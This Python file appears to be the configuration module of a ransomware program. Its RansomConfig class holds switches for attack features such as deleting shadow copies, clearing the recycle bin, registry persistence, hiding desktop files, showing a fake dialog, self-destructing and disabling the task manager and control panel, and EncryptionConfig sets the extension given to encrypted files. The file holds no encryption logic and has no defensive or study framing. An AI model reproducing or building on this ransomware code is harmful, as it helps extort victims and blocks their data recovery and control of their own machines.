from typing import Any
from typing_extensions import Self
from dataclasses import dataclass, field

__all__ = ["EncryptionConfig", "RansomConfig"]


@dataclass
class EncryptionConfig:
    extension: str

    @classmethod
    def from_dict(cls, obj: Any) -> Self:
        _extension = str(obj.get("extension"))
        return cls(_extension)


@dataclass
class RansomConfig:
    prevent_interrupt: bool = field(default=True)
    clear_recycle: bool = field(default=True)
    add_to_registry: bool = field(default=True)
    hide_desktop_files: bool = field(default=True)
    fill_desktop_with_junk: bool = field(default=True)
    minimize_windows: bool = field(default=True)
    close_all_windows: bool = field(default=True)
    self_destruct: bool = field(default=False)
    delete_shadow_copies: bool = field(default=False)
    fake_dialog: bool = field(default=True)
    disable_control_panel: bool = field(default=False)
    disable_task_manager: bool = field(default=False)

    # Magic Constants
    DEBUG_LOGS: bool = field(default=False)
    VERIFY_RUN: bool = field(default=True)
